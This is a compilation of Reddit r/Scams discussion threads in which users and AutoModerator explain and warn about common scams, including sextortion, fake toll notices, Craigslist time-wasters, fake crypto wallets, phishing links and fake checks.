- [removed]
- Literally just dealt with the same thing only she said she 19 and on Taimi I got a call saying she locked herself in the bathroom and tried to hurt herself. I was immediately able to tell it was a scam when I asked for the officers badge number and what precinct he served in. He wouldn't answer and just kept trying to push the narrative that I'm going to face serious legal ramifications if I don't settle this with the parents. As soon as I said it sounds like a scam they hung up
- I‚Äôm sorry - did this detective give you the contact information for the father of the girl who sexted you?




Hahahahahahhahahahhahahahhahaha
- Yes this! üëÜüëÜ Walk away! Block!
- Hi /u/borderpatrol, AutoModerator has been summoned to explain the Underage scam.

This scam usually starts on a dating app and you will encounter a normal woman whose profile says she is above 18. Later you will be contacted and told that the girl is underage. They'll usually pose as the girl's father, another family member, or a police officer. They will tell you that your life will be ruined and you will be a sex offender, but will offer you the chance to pay them to make the problem go away. The stories they use as to why you need to fork over money vary, but the common ones include therapy for the girl, payment for a broken phone or computer, etc.

Of course, there is no girl and no crime has been committed, so if you are involved in this scam all you need to do is ignore their threats and move on with your life. The scammers may contact you again in the future after you block/ignore them, so be ready in case that happens. If you have already sent money to the scammers, you should try to dispute the transaction and see if you can get your money back. This is a [very common scam](https://www.reddit.com/r/Scams/search/?q=underage&include_over_18=on&restrict_sr=on&t=all&sort=new) and [here](https://www.wired.com/story/the-phone-call-from-hell/) are [some](https://www.wcnc.com/article/news/crime/teen-says-hes-the-victim-of-a-sextortion-scam/275-21216b29-df76-44f4-b20a-cb726e19d42e) relevant news [articles](https://www.jbsa.mil/News/News/Article/1503978/sextortion-scams-continue-to-occur-dont-give-into-scammers-demands/).

- lol dude what a good post to ease this guys mind props
- This is 100% it.

When the police (real or fake) call you and tell you they are investigating (anything), you say ONLY that you invoke your rights and they need to speak with your lawyer and end the call (literally end the call.)

If it was real, they would be at your door, not on the phone.

Source: lawyer and former police officer.
- >**Police do not accept money to make charges go away.** Well, in some countries with bad police corruption they probably do.

Not to derail the thread, but ... I LOLd.

But let's just say that they don't do it by phone or text. And they're not doing it legally.
- THIS!!!!
- Yes -- lawyer is ignorant, or worse. OP, was it a real lawyer that you contacted on your own, or did the fake police officer direct you to a fake lawyer?

- Southern US accents. I do not live in the south
- Update. Got a second call from the dad. This time from a No Caller ID number. Looked up the original phone he used number says it‚Äôs computer generated. He texted me since I posted (prior to blocking him) this telling me I could get a loan and asking if I had any credit cards

- No he just said the ‚Äúfather‚Äù had the phone of the ‚Äúgirl‚Äùto call that number
- Real lawyer I contacted. I talked with several, the one I‚Äôve had for awhile (army lawyer) said it was likely a scam after I‚Äôd talked to a local lawyer which is kind of what led me down this rabbit hole

Title: Easily one of of the worst made scams I‚Äôve gotten via text
Body: Got this pdf from a random number. There are so many things wrong with this it‚Äôs actually funny. Doesn‚Äôt give an actual date, just a month and year, got this over text instead of mail, tolls are tied to cars via mail, no address or name. And finally, the actual name of the toll agency for my area is the Central Texas regional mobility Authority. I have interned with a state agency before and I can tell you that anytime they send mail or put up notices, they always put the full name of their agency. Don‚Äôt fall for this, if you‚Äôre genuinely worried just find your regional toll authority and check there.

- Unsolicited PDF's shouldn't even be looked at.
- [deleted]
- I wish legit organizations would send pdf statements, a lot send them inline on the emails, but my mortgage provider always makes me log in,  do 2FA, type in the loan number, and navigate.  They always seem to be doing maintenance when I log in, frustrating!
- You do NOT want to fuck with the TEA man

So does this notice just mean that you pretty much violated it every single day in January, all day?
- I got the exact same thing yesterday.
- You might be able to block all texts that come from email addresses. Check with your phone company.
- $6.99? It‚Äôs getting hard out there for a scammer, huh?
- Dude I got a pdf thru text and saw this out of curiosity I opened it and it was the same thing exact same lol
- I got this scam as well for a pre-paid device you can use in my state in your car for tolls on the turnpike. None of my family members use it as we just would drive on the turnpike two or three times a year to visit relatives.

Do not open PDFs or files from a random person emailing or texting you.
- Just got the same ‚ÄúNotice‚Äù in California.  So lame.
- If you click the link it brings up this picture Ohh and also you can not click on anything other than pay

Everything else is unclickable.
- Thanks for sharing. I hadn't seen this one yet.

I like how for date and time it just says January and doesn't even say what state. Casting a wide net.
- After traveling on the West Virginia toll road I received one as well.  Deleted and reported.
- EXACT DATE AND TIME:

...

"All of January lol"

  
No vehicle info, no proof of anything... Good lord. Though they'll send like 500,000 of these scams out and they're gonna get people falling for it.
- ü§îü§îü§î are you sure? looks totally legit to me. 

/s
- You are absolutely correct, I was mostly curious as to what it was.
- Yea, pretty low effort if I‚Äôm gonna be honest
- Everyday in January for the last 23 days. Every hour, every second. Meaning everyday costs me about 30 cents
- Yup. And the toll was $0.096774 per day, but (as always) it‚Äôs the late fees that kill you.
- lol, they probably just sent it out all at once
- Yeah they send it out to thousands tho and out of thousands I bet a couple hundreds fall for it so it probably ends up adding up. I literally got this exact thing this morning. So I‚Äôm guessing they send out a bunch to random numbers.
- If you fall for this,  the scammer gets your credit card number and can try to use it for other purchases.
- Lmao, even the title of the website is a dead giveaway away.
- Careful clicking links as they may have an identifier in the link so they know which email address responded to send you more spam.
- I upload to an online viewer rather than running anything locally if I'm curious.
- Yeah I‚Äôd expect they also steal the credit card number and/or end up adding an extra zero or two when they charge it for this.
- Oh for sure. I got the two for one special today I also had someone on rednote try the muse scam on me. I fucked with them a bit tho.

- There are a lot of holes in this story, but start with the country you're in, and who the order was "sold by."

Initiating a *return* (not refund) is something you can do, but the reason for return is particularly important, as is how the return was handled.

Talking to Amazon 3-4 times is ... a bit odd.  About what?

And finally, do you still have the boxing gloves or not?
- I find it strange you made a video of the unboxing for a weightlifting belt.  Something real expensive like a computer would make sense, but a weightlifting belt?

Do you still have the gloves?

You would need to return them to even consider a refund or replacement of your item
- Which country did this happen in? Does Amazon have its own delivery service in your country? Could the scam have been done in transit?
- What country? Was the order fulfilled by Amazon or a 3rd party seller?
- Period.
- India
refund was initiated the item was picked up from Me and after that no update 
I talked to the customer care about my product again and again because it was taking too long
- Wonder if it was a "too good to be true" price so they gambled on it and it bit them in the ass

Title: New Craigslist Scam- I'll meet you at the halfway point? What's the point?
Body: Oftentimes I post some old stuff I don't use on craigslist. It was a month ago. I posted a 3-years old bicycle on craigslist at 500 (bought it at around 1,200). One guy inquired about this bicycle and said said he could not drive a long distance because he's physically limited. He then offered to meet me at the halfway point. It was equally about 100 miles away from me and him. He also promised to pay me for the gas and my time, which is 100 more so I get 100 for the gas and time, 500 for the bicycle. 

I arrived at the halfway point and waited about 10 minutes but he didn't show up. I emailed him, and he replied he would be about 15 minutes late. He also said I'm sorry. Then he said 10 more minutes, 5 more minutes, and more. After over an hour waiting, I realized I was scammed (??) I wasted my gas and time then I drove back home with nothing. 

Fast forward to now, I posted a robot vacuum on craigslist and had a similar inquiries today- I really like your vacuum but I am too far away from you, so I want to meet you at the halfway point. Not one but 4 similar inquiries like that. Is it a new scam? Then, what's the point?

- Don't ever drive someplace "halfway." If they want it, then make them come to you. My bank doesn't accept *trust me, bro*, and neither do I.

Chances are halfway point is 30 seconds from their house. They're just bs-ing you.
- if you drove 100 miles you are more likely to accept a last minute price cut since you already invested a lot of time/money. And there is no downside for him to this approach (as you already found out)
- "he's physically limited" so he's buying a bicycle? Yet you still went?
- Craigslist is full of weirdos. I wanted to buy a nice leather chair from someone about 60 miles away. I booked a rental van. She sent me photos of her home to show how it might be difficult to get it  through a hallway so I got a friend to help. I was ready to pay cash. 

Then she spent weeks being too busy, not being home, never sending me the exact address. There was no scam, just a dingbat being a PITA. 

From now on, make them come to you, bring cash, and complete the transaction outside on the sidewalk.
- Waste your time so you post at a lower price. Waste your time just to Waste time....who knows. Not sure why you would drive 100 miles before getting payment lol
- probably kids just fucking with people. maybe this is the new version of crank calling.
- Screw that. I tell them to meet me in the parking lot of the police station a couple miles from home. If they show up, great. If they don't, I haven't wasted more than 30 minutes. I also know where the nearest ATM is in case they showed up short on cash.
- I tried to sell a car on Craigslist and one of the replies asked me to meet at a remote location 30 minutes away.  I offered to meet near there at the local police station or fire department and they never responded.

You‚Äôre the seller.  State clearly in your post that price is firm, cash only, FCFS and I‚Äôll meet you at xxx.  Anyone who refuses to agree to that is likely trying to scam or lowball you.
- Next time, you tell them when and where. And people change their minds. Fuck em. I‚Äôm not driving anywhere to sell shit.
- Not a scam most likely a flaker. I met lot of flakers on Craigslist. Nowadays I usually set up meeting place which is closer to my house and told buyer to call me when they close by. If they call me then I go out to meet them.
- You were punked. Don't do deliveries, people will abuse your trust, patience and hang you out to dry. If they want the item they should be the ones to put in the effort.
- Usually this is to bait and switch you but maybe sometime just decided to screw with you. Did someone else try and low-ball you before and get rebuffed?
- Did you ever actually talk to the guy or was it all messages?
- My best guess would be that someone is f'ing with you.  Perhaps it was someone whose lowball you rejected, etc.

If you're going to deliver or meet someone that far, consider requiring that extra $100 up front via PayPal F&F, Venmo, etc.  Then get the rest in cash at the meet. If they fail to show, at least you have the $100.
- They are actually observing from their vantage point to see how easy it might be to mug you. Or if they do present themselves as buyers, they‚Äôve already worn you down to accept their ridiculously low offer.  And spent a lot of time, fuel and car wear n tear   All lose lose lose for the seller
- To get you away from your house so they can rob it?
- Sorry but my fist thought was who the hell pays $1,200 for a toddlers bike!
- If the guy is "physically limited" WHY would he need a bike?   That is a contradiction and a lie.
- Maybe so when you get home he can say ‚Äúsorry I had an emergency, let me email you a check for 600$‚Äù or some other scammer crap.
- Not a scam, they're just fucking with you. A scam benefits them more than a laugh.
- We call them "Time Wasters".
- First time selling online? Craigslist and OfferUp and full of flakers. I always make it a point for buyers to meet near me. And to let me know when they‚Äôre 5-10 minutes away then I head to the meeting spot. If I get there and they‚Äôre not there then I know ain‚Äôt coming. You‚Äôre incredibly naive to have waited over an hour üòÇ
- People are dipshits and do weird things. In my opinion only extremely unreliable people even behave like this, so no.
- Halfway points are great in the following circumstance:
- Buyer drives all the way to your house
- Pays in cash for the item and for your time and trouble (which may be a lot more than the cost of the item, because, well it‚Äôs based on what all that time and trouble is worth to YOU) to deliver it to the halfway point.
- You then drive to a safe halfway point of your choosing while they follow
- The item is handed over to the buyer at the halfway point.

Simple!
- Unless they're just a couple miles away don't do that again I would never do that
- Probably teenage kids making fun of you
- Either pranking, or hoping your house will be unattended for a while, for...¬† Reasons.
- This definitely sounds like a scam tactic to waste your time and money. The whole "halfway point" thing is sketchy, especially since it conveniently benefits them and leaves you stranded.

For Craigslist sales, I‚Äôd recommend keeping it simple: meet locally in a safe public place, or don‚Äôt meet at all. If someone really wants what you‚Äôre selling, they‚Äôll figure out how to come to you. 

Scammers often rely on your willingness to accommodate unusual requests
- I have them put down a deposit of 10%.

A small amount, but enough that they come and pick it up
- It's just AH's trolling people, which is why you only sell items on your terms.  Period.

The other troll favorite is asking for more pictures.  I just tell them no and never hear from them again.
- If he‚Äôs physically limited and doesn‚Äôt want to drive very far what does he want a bike for? All these people that have some sort of excuse. All these long distance people ignore unless they want to drive where you are. Don‚Äôt except advance payments either. Only cash in person.
- If he's physically limited, how is he planning to ride a bicycle?
- [removed]
- I don‚Äôt drive and I still find a way to pick stuff up from people, wherever they want. It‚Äôs crazy to meet halfway. I def don‚Äôt expect someone to inconvenience themselves like that for me. People who really want a thing will find a way. Even if they‚Äôve gotta rent a U-Haul and leave work early.
- Anything of value in trade is done at a police substation. Letting them know this usually scares them off. This applies to other circumstances as well.
- This can sometimes work out but get them to PayPal or venmo at least half first. I was selling an oven and noted I had a truck but would charge for anything beyond the two nearest suburbs. Someone sent me $200 or something on PayPal & the rest when I got there.
- I'm shocked I had to scroll quite a ways before the usual reddit, "They were setting you up to be mugged and murdered" comment showed up.
- the point could just be to waste your time for fun or it could be real people who are not reliable buyers

the answer to anyone wanting you to drive 100 or 50 or 25 or even 10 miles is "No"
- I didn't realize Craigslist was still a thing 

I use Facebook marketplace which is still full of scammers but I always put in the description to meet at a police station and cash only and I've had nothing but easy transactions with that
- I‚Äôve met people the next county over but no farther. Isn‚Äôt worth it to me
- I sell stuff and have successfully met halfway. I always confirm right before I leave. Not sure if you did that‚Ä¶
- This reminds me of another CL scam.. you'll meet up and then suddenly they don't have as much money as you asked and want you to discount.

I sold a washing machine like this.  I helped this woman and her kids (showed up without a man) load the washing machine into her vehicle, then she said she didn't have all the money and asked if I would take a lesser amount.

I said, "Ok, well, let's get this thing UNLOADED then" at which point she mysteriously found the extra money in the car.

Maybe at some point they might say after you've driven pretty far, you're willing to sell for less?
- Doesn't sound like a scam,¬† sounds like a flaky time waster
- Sometimes they do this and will lowball you and try to change what was agreed upon after you drove that far thinking you will take less since you've already wasted your time. So many people will agree to buy something and say they will pick it up tomorrow then when the agreed upon time comes will say "I'm omw will you take ' insert stupid low price' " and for me that's when they instantly get blocked.
- I'm surprised you were not jumped and your bike stolen.
- Ask for 1/2 the price or at least the gas money as payment in advance by paypal or venmo, etc. . See how many stick around! In the orig. case, if the guy was physically limited how was he going to drive to the meeting point? Also, offer to ship it with payment in advance, like all ebay items.
- Who are still doing stuff thru craiglist?
- Some men just want to watch the world burn...
- Send it to them. They can pay you pal pal business so they feel safe ;) if not. Fooook‚Äôem!
- I think this is the 'trick.'  "Halfway point" is very close to their house.   The rest of the details are just ordinary craigslist flake behavior.
- I'm trying to figure out why OP was willing to drive 200 miles for an extra $100. "Sorry bro, that's too much work, I'm wait for someone in town to buy it".
- This is why I always aggressively follow the person home after a halfway sale.  Often I‚Äôll keep flashing my brights at them so I don‚Äôt alarm them.
- Yup
- Can you "reverse-Uno" them? Say you'll meet halfway, and tell them the halfway mark is down the street from your house?
- But they never showed up so there was no exchange of money
- That's correct: everytime I met the person at work or anywhere that I had to drive , they instantly haggle you over minutia in person. Now that I do it near me, I'm like "fine let me know if you are interested" , 0 time and 0 money on gas spent.
- My first thought too. That would have been my first red flag.
- Also too physically limited to drive 200 miles, but 100 is fine?
- I thought OP had a kid's bike.
- "There was no scam, just a dingbat being a PITA."


This.¬† There's an entire world full of flaky flakes who are completely oblivious to other people.¬† They not even inconsiderate because they have no concept of consideration.¬† Just flakes.¬† Perhaps narcissistic, self-centered, oblivious.


In the case if the OP, though, that seems a stranger on the internet who likes to fuck with people.
- Maybe then "another person" reaches out to OP to buy the item locally at a lower price and OP is so frustrated they agree?
- Might perhaps have been watching you from a nearby window to see if you were someone he could overpower and take the bike off you without paying?  And then saw you and thought, nah, he's too big for me to tackle, or something...
- There‚Äôs no payoff though. ‚ÄúHa ha, we made them think we have an extra $100‚Äù. Makes no sense.
- Exactly, don't let these a-holes win.
- I ALWAYS mention the EXACT cash part.. I have no change.. So you cant low ball (oh, I only have a 100 or a 10.. Will you take 10 for that..???) and no, NO cash to steal..
- Honestly this seems like the most likely scenario.  You went there, they drove by, saw you were not an easy mark, and moved on.  This sounds like an attempted mugging.
- If OP is 100 miles away, I know that I‚Äôll have at least a couple of hours before he eventually gives up and gets back.
- What made you think it was a toddler bike?
- Same first thought here.
- Gifts exist
- and 100 miles is OK, but physically limted to that 100.. .

Please read the following gudeline: [How to submit a good post to r/scams](https://www.reddit.com/r/Scams/comments/1fw44zb/guide_how_to_submit_a_good_post_to_rscams/), where we describe what a good post is for us.

## We need the full story
Make sure your explanation covers the "five Ws" of journalism: a checklist of all the essential points of a proper story.

- **WHO?** Who is involved? Is it someone you met in person? Is it an "online friend"? But remember to not post full names or uncensored photos of people, even if it's a scammer.
- **WHAT?** What happened exactly? What were you doing, what were you trying to do, what were the scammers telling you?
- **WHEN?** A proper timeline is essential to understanding the scam.
- **WHERE?** Was this in person? Was this online? If it was online, write the website address in the title of your new post. Sometimes scammers impersonate legitimate businesses, so a website address is essential. Don't post clickable links.
- **WHY?** Why are you posting? You need help to determine if something is a scam, or you're posting to report a scam to our community?
- **HOW?** How did the scam go about? How you paid them money, how they tried to make you pay, how can someone avoid getting scammed?

## Visually impaired users can't read screenshots 
Don't use a screenshot if what you're sharing is a block of text, because screen readers can't read images. This is especially disallowed if you're sharing an email you received or a SMS or social media conversation. You should rather copy and paste the text as is. We usually don't need a screenshot to determine if something is a scam, so use them sparingly.

## Don't share news articles or YouTube videos
If you want to share an informational piece on an external website, post again, writing your own summary of the article in the body of the post. Do not do it in the comment section. Videos should be shared as video uploads.

- Why my ads say EXACT cash only...
- Cash in hand before anything gets loaded or handed over
- I sell music gear online I get at auction.¬† Occasionally if it's something larger or something I think will be easy to sell I put it on Craigslist.¬† There are 3 different dudes I see over and over again that will ask about something or even get to the point where we plan to meet and they flake out.¬† This one dude Gary always asks if something available within half a day of me posting it.


I really want to meet these people and see how lonely they are cause they must be emailing everyone.¬† I just ignore them now unless I'm feeling frisky then I'll fuck with em.
- When I was on the dating apps, I‚Äôd offer to meet ‚Äúhalfway‚Äù for first dates and then pick ones of the bars closest to my house.
- Not OP but I just love long drives and being on the road with music going. Offsets the cost of something already fun.

That said I'd not do that for a craigslist person who will almost certainly be a flake
- So if your car gets 25mpg, and gas is $3/gallon, we are talking $24 in gas. That means $76 for 3 hours drive time, or $25/hr. Pretty good compensation for many.
- I come inside their house and snuggle with them to make sure they like their purchase. Sometimes, we make breakfast together while I play "Careless Whisper" on my phone.
- Your bright lights are actually warn them about the serial killer in the back seat.  Very helpful to let them know.
- He probably didn't "feel like" showing up when the time came.
- Yeah, so what's the point of the scam??
- 3 years old not 3 year old's.
- I have found Facebook marketplace to be much worse than Craigslist.
- Yeah, we had a meeting scheduled last Tuesday but not enough of us showed up to make quorum.
- He travels 100 miles and they enjoy they wasted his time.
- For a child with nothing to gain or lose it makes sense
- Haha Yes!  Years ago someone tried to pull this on me.  I met them at a designated sales spot in the police parking lot about a mile from my house.  I told them in advance to bring exact cash I will have no change, I will not take a check (this was back in the day) or paypal.   

The price was $50 and they were getting a REALLY good deal already.  They pretended to only have a $100 bill and a $20 bill. Of course he was a TERRIBLE actor, trying to act all surprised to only find those two bills in their wallet.   Goly gee, how did THAT happen??   

After I confirmed that, true to my word, I did not have change, they asked if I would take $20 for it. 

I said nope and got into my car to leave.  As I was getting in the car he said, "Wait! Wait, I think it might be in my car, hold on a second!  He dove into the car and immediately pulled the $50 out from somewhere (without having to look for it) and then held up over his head waving it at me as I was driving away.  

I just left him standing there because nah, fuck that guy. I truly hate a BS fucking scammer and at that point I'd rather donate the fucker to goodwill before selling it to this asshat.    Sir, I'm offering you a very good item at a more than fair price and you gotta pull this bullshit? 

Sold it the next day to my neighbor for $75 so it all worked out!
- >I posted a 3-years old bicycle on craigslist
- I get this too sometimes, and I think is people trolling or just bored people using this conversation like they are going to buy and then not buy at the last minute. I don't know what the plan is but this is the reason why I don't meet anyone anywhere, and I make the meet point somewhere around the corner that I can go at walking distance. If it's too heavy then I have no other choice than meeting them at my door.
- So you establish a habit of lying as the very first move in new relationships. Nice, gotta keep them guessing
- Did you ever get lucky? I could imagine them being very annoyed with you when finding out how "halfway" your home really is.
- When you find out later you're neighbors because you both lied about where you lived. Maybe just get married when that happens.
- If you like driving. I used to travel a lot for work, and I drive as seldom as possible now.
- More like driving 3 hours and you get a raffle ticket that might win $100.¬† The 100 was not prepaid.
- The cost of driving is much more than gas.
- <Starts looking around the house for something to sell you>
- I bet you get a lot of return business!!
- You just want to make friends enough that you can be part of when "Last Christmas" is the song you're all together like the music video.
- Omg this thread, I‚Äôm dying laughing .
- The scammer buys stock in Chevron and Firestone.
- Either just someone screwing with him OR scammer is going to come back under a different account and try to offer less. OP might figure "Well, i've already wasted all of this time/money/effort so I'll take a lower price just to be done with it."
- Oh, Oops quick reading.
- Yes. I won't go near Facebook Marketplace with a twenty foot pole. Every scammer and lunatic is on there with fake profiles.
- Both my GF and I have had really good luck selling on Facebook Marketplace. Craigslist was where all the flakes were.

Recently, I sold a DeWALT jobsite table saw. From the time he contacted me to the time he was driving off was about 4 or 5 hours. No haggling on price and he drove a bit over 20 miles, with a bridge toll in there, too. Lots of other stuff sold on FB Marketplace and most have been excellent transactions.
- Or at least that‚Äôs what was posted on the group chat.
- The bike is 3 yo
- Lol dammm. I totally missed that. Good catch lol.
- I can't tell if you're trying to make a joke.
- a 3 yo bike...
- More so if they live in a "halfway house".
- It‚Äôs usually smoothed over by the act of sex
- I friggen hate driving now that im in late 60s.. Worse in the rain, worst is rain and night...
- I don't mind driving. Traffic is no fun however, so I try to schedule any rides outside of prime time.
- I miss the awards so much
- I don't understand why some people don't like George Michael. Like, why are you screaming and running away from me?
- That made me laugh. I don‚Äôt know why, but at least you‚Äôve earned a point.
- Right, as in OP bought it 3 years ago
- The bike belonged to a three year old.  I think it‚Äôs the way he wrote it out.  I also for some reason thought he was talking about a toddler bike until I got to the price and then read it again.
- Only if the sex is good lol

Unless sex was discussed beforehand, I could see the deception change their initial consideration of sex. People don't like being lied to and not everyone is horny enough to look past a few lies.
- And the stupid SUPER bright LED lights.
- If you're not playing it on the saxophone you're not worth my time.
- Then maybe they‚Äôre a better match for someone else and that‚Äôs ok!
- Those are accidents bolted to the front of the vehicle. I have no idea why that is still legal. I think the problem is previously the law has only recognized a legal minimum level of brightness, not a maximum. It's definitely time to update the law to recognize current tech
- OMG.. DO NOT GET ME STARTED ON LEDS... OH My...
- I'm just trying to make some cute clay pottery, and you're yelling: "Why are you in my house and have your hands wrapped around me?" Knock it off.
- Why not just tell them that you know a good place for drinks and that's it? There's like no reason to start something with a lie. It kind of sets a tone about effort and consideration as well.
- You're really overthinking this. I rarely date outside of my neighborhood as it is. They might have a 15 minute walk back home from the bar instead of a 10 minute one. Poor guy.
- I think a lot of people are probably glazing over the following: I assume you're a woman and make said plans at least partly as a safety thing. 

Ergo, most guys aren't mad afterwards, especially if they end up getting laid, because they past the vibes test which is more of a compliment than any perceived slight at being misled at first.

- No. It's always a sign of a scam.
- Why would they? because they put greed over common sense. been around as long as money has been around. The Bible even warns about it.
- !crypto scam, every time
- You never have to pay something, there might be a fee that is deducted from the account or from the final amount that you receive when you do the withdrawal.

But never a requirement to add money to the account or to another account before making the withdrawal.
- This is always a scam in any context. And if it is "your" money you are trying to withdraw it is already gone and you will never get it back.

Also if anyone ever gives you money and then asks you to pay them back with some or all of it, it is always a scam. The original money is a fake or bad check, counterfeit, or not real in some other way.
- If you're ever told you have to pay to withdraw a balance, you are dealing with a scam.
- Hi /u/Ok-Lingonberry-8261, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

Title: Show attendees list scam? (never ending - help pls)
Body: I keep on getting emails from the same person replying to their own emails (from different email addresses) about interest in an attendees list for random events? the emails just changed a little bit every time. I assume it's a scam, but how do I stop receiving these emails if every time I block, a new email address appears. I dont want to reply to the OPT-OUT but these are getting annoying. The emails also use my name and I'm wondering how they got it.

It'd be really helpful if someone could let me know because I've been getting these for months and I've had enough.

- Set up a filter to send all these emails to the spam / junk folder.
- How did they get your name? Possibly online, it's public information.  Your address, phone number, relatives, people who live with you, email addresses, past addresses are all publicly available. If you do a Google search with your name or phone number, it will return multiple sites like Spokeo and Radaris that have your address, former addresses, people who live with you.

Title: International Parcel Service (IPS) Scam?? Didn't send money but clicked link.
Body: Hello. I got an email that said it was from UPS - and since I've been waiting for a while on a package I wanted to know whats up. Granted it was midnight and I was half asleep. 



I never sent any money, didn‚Äôt give it any information. Just clicked two things (the initial link and one more i can't remember what it said) before realizing and immediately getting off of it. I changed my Password to my Google accounts and locked all my bank cards. What do I do now? Am I safe? Should I get a new card all together?

- International Parcel Service is where Doug Heffernan in The King of Queens works. If you get an e-mail or text message from IPS, it is guaranteed to be a scam.
- Noted! I did not know that. Am I safe though? If I didn't give them money? I saw somewhere that all they'll do is give more emails, but I'm a tad paranoid
- If you \*typed\* your credit card or account information but didn't "submit", you're not in the clear. If you never typed it at all, then you're fine. Typing in a browser is as bad as hitting enter since Javascript in a website can relay anything that's been typed into that browser tab back in realtime.
- The credit card number was not typed at all! I didn't even get to that screen before I left it completely. So I should hopefully be safe?

- Trying to steal somebody's doctor appointment money has to be a new kind of low.
- I wonder what kind of biometric security needs an Apple gift card.
- Always contact support on platform rather than emailing a random address supplied to you by an unknown. 

Of course, enough of a red flag re: gift cards, but with a more elaborate scam there's a chance it could catch you off guard.

I just got the message too. Scamming people who needs the support is just sad.
- Dangg, i have just received the same email about 'i came across blabla' but the creepy thing is I DONT HAVE a gogetfunding account using that email?! Like i did create one before but I was using a different one. It's actually creeping me out how did they got my emails
- They take advantage of your needs for their own gain. It is so unfair. Especially the way they made me feel was really awful.
- Hahahah üòÇ always the gift cards
- Scammer's doing a screening to see if the target meets their minimum qualifications of being gullible/naive enough to scam! üòÇ
- That part kinda surprised me - I am still learning about different scams here & I've not seen one that said to go get the gift card & give them the code & gave that BS reason for needing the code.  Imo, if no other red flag stood out prior to that part, I would hope the recipient of the email would instantly realize it was a scam (like OP did). The scamming scum may as well have put a disclaimer above the email's greeting that says, "what you are about to read is a scam..." Unfortunately, I'm sure it works on some folks, and it just makes me so angry & upset for the victims. I feel bad for OP because that must've been like a gut punch when she realized it was a scam after the elation she probably felt when she read the "pastor's" email. Ugh, I hope that scammer smokes turds in hell üò°
- That‚Äôs what makes them so effective. Especially with job scams. People get so excited they landed a great new job,  big pay increase, better hours‚Ä¶ maybe they even told their family about it. 

Then when it starts to feel suspicious, they are now so psychologically invested that they just go along with the scam in the hopes that maybe it‚Äôs real‚Ä¶ because the alternative would just be too heartbreaking

- Hi /u/Wide-Spray-2186, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- Recover what? He didn‚Äôt lose any money
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.


**
- He will when the bank starts assessing returned check fees and blacklists him on Chex.
- Read the automod explanation about the fake check scam. Make sure that you understand it, so this kind of scam doesn't happen to you.
- He said he‚Äôs calling the bank to notify them of the situation. He should be more concerned about getting reported on Chexsystems, like you said, and getting his account closed by the bank..not people hitting him up to recover the little $20-$30 bounced check fee he might have to pay
- lol understand what? This little Mickey Mouse check scam that‚Äôs been around for over a decade and is barely even profitable these days? These are amateurs‚Ä¶anybody with some check paper, MICR ink printer, and some acct/routing numbers can do this.

Title: How to get out of Instagram "Market Co" investor scam
Body: My dad gave all his info to this entity called "Market Co," he says. He invested $350 with the promise of making thousands. When he told me this I obviously freaked and told him to cancel his credit card and block their number. He says they keep calling back with different numbers no matter how many times he blocks them and asks them to close his account. They are telling him he needs to withdraw what he made and he can make more money if he does this etc etc. He doesn't know how to get them to stop calling and it's making him anxious. He's really scared that they'll take more money from him. 

Is there any way to get out of these scams? I have no experience with them so I'm unsure of how to help him. Can he call his bank and ask them to help? 

Thanks.

- >blocking

Good, that's a start.

>asks them to close his account

That's not blocking. He absolutely HAS to keep blocking any new numbers and not answer the phone or reply to messages.
- Hang up and block every time, don‚Äôt say a word, just hang up and block the number.

They will give up as soon as they realize they can‚Äôt get more money from him.
